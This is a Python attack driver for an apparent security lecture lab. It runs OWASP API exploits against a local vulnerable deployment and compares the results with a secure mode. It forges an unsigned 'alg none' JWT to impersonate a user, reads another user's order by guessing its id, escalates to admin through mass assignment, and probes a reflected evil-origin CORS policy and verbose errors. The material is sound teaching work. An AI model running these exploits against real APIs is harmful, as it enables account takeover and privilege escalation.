"""
Attack driver for the Lecture 10 vulnerable API.

Runs the three exploits end to end so you can watch each one succeed against the
vulnerable deployment (SECURE_MODE=false) and fail against the fixed one
(SECURE_MODE=true). It prints, for each step, the request and the API's answer.

  1. API2 Broken authentication - forge a token for alice with NO signature and
     read her profile. (In secure mode the forged token is rejected.)
  2. API1 BOLA               - as bob, read alice's order o-1001 by guessing the id.
  3. API3 Mass assignment    - as bob, PATCH our own profile with {"role":"admin",
     "credits":999999} and escalate.

Tokens for the "real" calls come from the lab Keycloak via the public
spa-token-demo client (password grant); the forged token is hand-built here to
show broken authentication needs no key at all.

    python demo/attack.py
    python demo/attack.py --base https://vuln-api.192.168.50.10.nip.io
"""
import argparse
import base64
import json
import sys

import requests

requests.packages.urllib3.disable_warnings()  # lab self-signed CA

KEYCLOAK = "https://keycloak.192.168.50.10.nip.io/realms/api-security"
TOKEN_URL = f"{KEYCLOAK}/protocol/openid-connect/token"


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def real_token(username: str, password: str) -> str:
    """A genuine Keycloak access token via the public spa-token-demo client."""
    r = requests.post(TOKEN_URL, data={
        "grant_type": "password", "client_id": "spa-token-demo",
        "username": username, "password": password}, verify=False, timeout=10)
    r.raise_for_status()
    return r.json()["access_token"]


def forged_token(username: str) -> str:
    """A completely unsigned JWT claiming to be `username`. No key involved."""
    header = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    payload = b64url(json.dumps({"preferred_username": username,
                                 "email": f"{username}@forged.local"}).encode())
    return f"{header}.{payload}."   # empty signature


def show(label, resp):
    body = resp.text
    try:
        body = json.dumps(resp.json(), separators=(",", ": "))
    except Exception:
        pass
    print(f"  {label}: HTTP {resp.status_code}  {body}")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default="https://vuln-api.192.168.50.10.nip.io")
    args = ap.parse_args()
    base = args.base.rstrip("/")

    mode = requests.get(f"{base}/api/health", verify=False, timeout=10).json()
    print(f"Target {base}  (secure_mode={mode.get('secure_mode')})\n")

    # 1. Broken authentication - forge alice with no signature.
    print("[1] API2 Broken authentication: forge an unsigned token for alice")
    h = {"Authorization": f"Bearer {forged_token('alice')}"}
    show("GET /api/me as forged alice", requests.get(f"{base}/api/me", headers=h, verify=False))

    # 2. BOLA - bob reaches for alice's order.
    print("\n[2] API1 BOLA: bob reads alice's order o-1001")
    hb = {"Authorization": f"Bearer {real_token('bob', 'bob')}"}
    show("GET /api/orders/o-1001 as bob", requests.get(f"{base}/api/orders/o-1001", headers=hb, verify=False))

    # 3. Mass assignment - bob escalates himself.
    print("\n[3] API3 Mass assignment: bob sets role=admin, credits=999999")
    show("GET /api/me (before)", requests.get(f"{base}/api/me", headers=hb, verify=False))
    show("PATCH /api/users/me {role:admin,credits:999999}",
         requests.patch(f"{base}/api/users/me", headers=hb, verify=False,
                        json={"role": "admin", "credits": 999999, "display_name": "Bob"}))

    # 4. Security misconfiguration - open CORS + verbose errors + missing headers.
    print("\n[4] API8 Security misconfiguration")
    r = requests.get(f"{base}/api/health", headers={"Origin": "https://evil.example"}, verify=False)
    print(f"  CORS reflect evil origin: Access-Control-Allow-Origin={r.headers.get('Access-Control-Allow-Origin')}"
          f"  Allow-Credentials={r.headers.get('Access-Control-Allow-Credentials')}")
    missing = [h for h in ("X-Content-Type-Options", "X-Frame-Options", "Content-Security-Policy")
               if h not in r.headers]
    print(f"  missing security headers: {missing or 'none'}")
    r = requests.get(f"{base}/api/orders", params={"limit": "abc"}, verify=False)
    body = r.json() if r.headers.get("content-type", "").startswith("application/json") else {}
    print(f"  verbose error (GET /api/orders?limit=abc): HTTP {r.status_code}"
          f"  exception={body.get('exception')}  traceback_lines={len(body.get('traceback', []))}")

    print("\nDone. Re-run against the SECURE_MODE=true deployment to see each attack fail.")


if __name__ == "__main__":
    sys.exit(main())
